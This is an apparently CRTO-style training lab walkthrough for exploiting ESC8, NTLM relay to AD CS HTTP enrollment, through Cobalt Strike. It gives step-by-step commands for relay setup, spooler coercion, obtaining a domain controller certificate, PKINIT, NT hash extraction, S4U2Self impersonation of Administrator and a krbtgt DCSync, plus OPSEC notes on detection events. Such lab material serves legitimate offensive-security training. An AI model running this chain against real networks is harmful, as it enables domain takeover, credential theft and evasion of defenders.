# ESC8 NTLM Relay to ADCS HTTP Endpoints

>The objective of this lab is to identify and exploit ESC8.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Enumerate the certificate authority for vulnerabilities.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
    ```

⚠️ This will show that *lon-cs-1* is vulnerable to ESC8.

===

## Relay Setup

1. Use Beacon to start a SOCKS proxy.
    1. `socks 1080 socks5`
    
2. Run `netstat` to see that port 445 is currently bound.

3. Set the *lanmanserver* service's start mode to *disabled* to prevent it from automatically restarting.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
    ```

4. Stop these services in the following order to unbind port 445.
    1. `sc_stop lanmanserver`
    2. `sc_stop srv2`
    3. `sc_stop srvnet`

⚠️ Run `netstat` and verify that 445 is no longer bound.

5. Start a reverse port forward that will bind to port 445 and redirect the traffic to *127.0.0.1:7445* on the attacker desktop.
	1. `rportfwd_local 445 localhost 7445`

⚠️ `netstat` will show 445 being bound again, but the PID will be that of the Beacon.

6. Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation.  Add the rule:

    ```Beacon-nocolor
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
    ```

===

## Relaying

1. On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
    1. `docker container start -i kali-1`

2. Configure proxychains to use Cobalt's SOCKS proxy.
    1. Open `/etc/proxychains.conf` in vim or nano.
    2. Scroll to the last line.
    3. Replace the default socks4 entry with `socks5 10.0.0.5 1080`
    4. Save the changes.

3. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint.  We're going to relay the credentials of a domain controller, so we'll specifically request a *DomainController* certificate.

    ```Beacon-nocolor
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```

4. While that is waiting, go back to Beacon.
5. Coerce the domain controller into authenticating to the current machine.

    ```Beacon-nocolor
    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    ```

⚠️ The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy.  A file called **LON-DC-1.pfx** should be created.

6. Press Ctrl+C to stop ntlmrelayx.

===

## Post-Exploitation — LON-DC-1.pfx → Domain Administrator

> **Perform these steps before Cleanup** while the SOCKS proxy is still active. The PFX is on the Kali Docker container. Two paths are documented: Kali Docker (PKINITtools/Certipy — no PFX transfer needed) and Windows Beacon (Rubeus — requires PFX transfer).

---

### Path A — Kali Docker (Recommended — stays off Windows beacon)

#### Step 1 — PKINIT: Authenticate as DC machine account using PFX

> **Note:** `certipy` is not installed in the CRTO lab Kali Docker image. Use PKINITtools (`gettgtpkinit.py` + `getnthash.py`) instead — these are pre-installed at `/opt/PKINITtools/`.

**Step 1a — Get TGT for LON-DC-1$ via PKINIT:**

```bash
proxychains python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx LON-DC-1.pfx CONTOSO.COM/'LON-DC-1$' LON-DC-1.ccache
```

> **OPSEC-CAUTION** — Generates **Event 4768** (AS-REQ using PKINIT certificate pre-auth) on the DC. PKINIT requests are distinguishable from password-based AS-REQs in KDC logs and MDI.
>
> **Critical:** Note the `[*] AS-REP encryption key` printed to stdout — you need it for Step 1b.

```bash
export KRB5CCNAME=LON-DC-1.ccache
```

**Step 1b — Extract NT hash of LON-DC-1$ via U2U Kerberos:**

```bash
proxychains python3 /opt/PKINITtools/getnthash.py \
  -key <AS-REP_encryption_key_from_step_1a> \
  CONTOSO.COM/'LON-DC-1$'
```

> **OPSEC-CAUTION** — Performs a U2U (User-to-User) TGS-REQ to extract the NT hash from the PAC. Generates **Event 4769** on the DC. Note the NT hash printed to stdout — used in Step 4 if DCSync is the objective.

#### Step 2 — S4U2Self: Impersonate Administrator to the DC

Use `gets4uticket.py` from PKINITtools to request a service ticket as Administrator to the DC via S4U2Self. Domain Controllers have unconstrained delegation enabled by default, making the resulting S4U2Self ticket forwardable and usable.

```bash
proxychains python3 /opt/PKINITtools/gets4uticket.py \
  -spn 'cifs/lon-dc-1.contoso.com' \
  -impersonate Administrator \
  CONTOSO.COM/'LON-DC-1$' \
  Administrator.ccache
```

> **OPSEC-CAUTION** — S4U2Self generates **Event 4769** (TGS-REQ) on the DC. The impersonated user (Administrator) appears in the ticket's PAC but no actual logon occurs at this point. MDI may flag S4U2Self requests for high-value accounts.

```bash
export KRB5CCNAME=Administrator.ccache
```

#### Step 3 — Prove DA Access: List DC C$ share

```bash
proxychains impacket-smbclient -k -no-pass 'CONTOSO.COM/Administrator@lon-dc-1.contoso.com'
```

> **OPSEC-SAFE** — Kerberos ticket-based SMB access generates **Event 4624 Type 3** (network logon) on the DC — identical to legitimate admin access. No service creation, no remote process spawn.
>
> At the SMB prompt: `shares` to list shares, `use C$` then `ls` to list C:\ root, `get Users\Administrator\Desktop\root.txt` for the flag.

#### Step 4 (Alternative) — DCSync using DC machine account NT hash

If you need credential material (e.g. krbtgt hash for a Golden Ticket), use the NT hash from Step 1 directly against the DC's replication interface:

```bash
proxychains impacket-secretsdump \
  -just-dc-user 'CONTOSO/krbtgt' \
  -hashes :<LON-DC-1$_NT_hash> \
  'CONTOSO.COM/LON-DC-1$@lon-dc-1.contoso.com'
```

> **OPSEC-CAUTION** — DCSync via machine account hash generates **Event 4662** (Directory Service Access with replication GUIDs) on the DC. MDI and Defender for Identity specifically alert on replication requests from non-DC sources. Use only when krbtgt hash is the actual objective.

---

### Path B — Windows Beacon (Rubeus — CS-native)

> The PFX is on the attacker desktop (`C:\Tools\LON-DC-1.pfx` after `docker cp`). The beacon runs on a domain-joined target — file paths in Rubeus resolve on the target, not the attacker desktop. Pass the certificate as an inline base64 string to avoid any disk write on the target.

#### Step 1 — Base64 encode PFX on attacker desktop

Run in PowerShell on the attacker desktop:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
```

Copy the full output string.

#### Step 2 — Request TGT for DC machine account via PKINIT

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:<base64_pfx_string> /enctype:aes256 /nowrap
```

> **OPSEC-SAFE (no disk write on target)** — Certificate is passed in-memory as a Rubeus argument; nothing written to the target filesystem. `execute-assembly` still spawns a sacrificial process (CAUTION tier). PKINIT AS-REQ generates **Event 4768** on DC. Note the base64 TGT from output.

#### Step 3 — S4U2Self to impersonate Administrator

Use the DC machine account TGT to perform S4U2Self, requesting a CIFS service ticket as Administrator to the DC. The `/self` flag specifies S4U2Self (no S4U2Proxy required — DC machine account is trusted for delegation to itself).

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt
```

> **OPSEC-CAUTION** — Generates **Event 4769** (TGS-REQ S4U2Self) on DC. `/ptt` injects the resulting service ticket into the beacon's logon session in-memory — no disk write.

#### Step 4 — Prove DA Access

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-SAFE** — SMB access via injected Kerberos ticket. Generates **Event 4624 Type 3** on DC only. No remote process spawn, no service creation.

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-SAFE** — File read over existing beacon C2 channel. Generates **Event 4663** on DC if Object Access auditing is enabled.

---

### ESC8 Full Chain OPSEC Summary

| Stage | Action | OPSEC | Key Events |
|-------|--------|-------|------------|
| Enum | Certify enum-cas | CAUTION | LDAP to DC (1644) |
| Relay setup | Stop lanmanserver / rportfwd | CAUTION | Service control events (7036) |
| Coerce | SharpSpoolTrigger | UNSAFE | Print spooler RPC — Event 4624 on target |
| Relay | ntlmrelayx → ADCS | CAUTION | CA Events 4886/4887 — always logged |
| PKINIT | gettgtpkinit.py / Rubeus asktgt | CAUTION | Event 4768 (PKINIT AS-REQ) on DC |
| NT hash extract | getnthash.py (U2U) | CAUTION | Event 4769 (TGS-REQ U2U) on DC |
| S4U2Self | gets4uticket / Rubeus s4u | CAUTION | Event 4769 (TGS-REQ) on DC |
| Prove DA | smbclient / ls C$ | SAFE | Event 4624 Type 3 on DC |
| Cleanup | Restore services / firewall | — | Reduces forensic footprint |


## Cleanup

1. Stop the SOCKS proxy.
    1. `socks stop`

2. Stop the reverse port forward.
    1. `rportfwd stop 445`

3. Restore the services back to default.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    ```

    1. `sc_start srvnet`
    2. `sc_start srv2`
    3. `sc_start lanmanserver`

4. Remove the firewall rule.

    ```Beacon-nocolor
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
    ```

⚠️ This lab, you have learned how to identify and exploit ESC8 through a C2.

